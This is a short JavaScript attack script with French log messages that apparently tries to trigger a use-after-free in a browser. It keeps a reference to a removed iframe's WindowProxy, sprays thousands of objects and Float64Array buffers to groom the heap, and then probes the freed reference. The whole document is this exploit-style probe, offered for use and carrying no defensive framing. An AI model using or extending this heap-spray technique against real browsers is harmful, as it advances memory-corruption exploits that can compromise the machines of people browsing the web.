(() => {
  log("[*] uaf_memory_spray — tentative de réutilisation mémoire autour d’un WindowProxy libéré", "info");

  const HTML_PLD = `<body><script>window.addEventListener("message",e=>{});</script></body>`;
  let leak = null;

  const iframe = document.createElement("iframe");
  iframe.setAttribute("srcdoc", HTML_PLD);
  document.body.appendChild(iframe);

  setTimeout(() => {
    leak = iframe.contentWindow;  // 💣 UAF référence
    document.body.removeChild(iframe);
    log("[+] iframe supprimé — leak conservé", "info");

    // 🧱 Spray d’objets JS
    const sprayObjs = [];
    for (let i = 0; i < 10000; i++) {
      sprayObjs.push({
        a: 0x41414141,
        b: "UAF_MARKER_" + i,
        c: function () { return i; }
      });
    }

    // 🧱 Spray de buffers mémoire
    const buffers = [];
    for (let i = 0; i < 10000; i++) {
      const buf = new Float64Array(8);
      buf[0] = 13.37;
      buf[1] = 9007199254740991;
      buffers.push(buf);
    }

    // 🔍 Test d’accès à leak
    try {
      const href = leak?.location?.href;
      log(`[✔] leak.location.href: ${href}`, "success");
    } catch (e) {
      log(`[!] Exception post-UAF: ${e.message}`, "error");
    }

    // 🔍 Vérification du contenu sprayé
    const sample = sprayObjs[Math.floor(Math.random() * sprayObjs.length)];
    log(`[+] spray sample: a=${sample.a}, b=${sample.b}`, "info");

    log("[✓] Fin spray structuré autour de UAF", "info");

  }, 300);
})();
